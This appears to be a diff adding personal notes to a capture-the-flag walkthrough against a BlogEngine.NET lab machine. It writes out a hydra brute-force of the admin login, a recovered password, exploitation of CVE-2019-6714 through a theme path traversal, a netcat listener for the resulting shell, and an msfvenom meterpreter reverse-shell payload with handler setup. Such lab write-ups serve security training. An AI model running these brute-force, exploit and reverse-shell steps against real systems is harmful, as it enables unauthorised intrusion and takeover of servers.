@@ -28,6 +28,61 @@ TCP Sequence Prediction: Difficulty=262 (Good luck!)
 IP ID Sequence Generation: Incremental
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
+------------------
+
+Went to webpage and admin page
+
+Ran hydra against the login page with the username "admin".
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.208.52 http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=c%2BnDmBxuUGpM99XV2Ppr5EnLjQr9chIh2VXd9h7bU4in5oZdU6B2kknW%2Bh197bY9WFjdGJ%2Bz3KK19m%2BEBYA%2BIK30ElnaovIi2LvsU0nD7KbSogzOcQ7JHS3hDehwBxcixtAaxJdJzebt3ljw6rO8edCsy4Zfpph17k3wUasvchcPP44d&__EVENTVALIDATION=o1%2B4L2ebyy88zHga47L3T3zJ1aWeH51WdGmO%2F4BZ%2FaaIL0onzYYcTgmHvQJ73w9E9Pfl19yM8vJ9QBN8AUkJ66c174ze0MWrTe2vq2XEGS6kzU6EM08ZjYZ5tbbLEv8iILmDTj525g7UPITb1mjfp2FPnJ4qo3%2FC6jNc6yYaZQMUBq07&ctl00%24MainContent%24LoginUser%24UserName=^USER^&&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
+
+Password = 1qaz2wsx
+
+----------------
+
+Found BlogMe version at Admin portal under About tab
 
 
-hydra -l admin -P /usr/share/wordlists/<wordlist> http://10.10.208.52/Account/login.aspx http-post-form
+Your BlogEngine.NET Specification
+
+    Version: 3.3.6.0
+    Configuration: Single blog
+    Trust level: Unrestricted
+    Identity: IIS APPPOOL\Blog
+    Blog provider: XmlBlogProvider
+    Membership provider: XmlMembershipProvider
+    Role provider: XmlRoleProvider
+
+
+Exploit db search:
+CVE-2019-6714
+
+Downloaded file and saved it as PostView.ascx
+
+Uploaded the file via editing a post.
+
+started a listener - nc -lvnp 4444
+
+Triggered the vuln. by accessing the base URL for the blog with a theme override specified like so:
+ http://10.10.10.10/?theme=../../App_Data/files
+
+-> got windows shell
+
+-------------------------------------------------------------------------------------------
+NOW TO UPGRADE OUR WINDOWS 'SHELL WITH MSFVENOM!
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=[LOCALIP] LPORT=[LPORT] -f exe > reverse.exe        - CREATING THE PAYLOAD VIA MSFVENOM
+-> Make sure LPORT is different from the port you used in the BlogEngine exploit. <-
+
+NOW TO SETUP A METERPRETER HANDLER
+
+msfconsole
+use exploit/multi/handler
+options        - set appropriate options
+
+
+
+
+
+
+
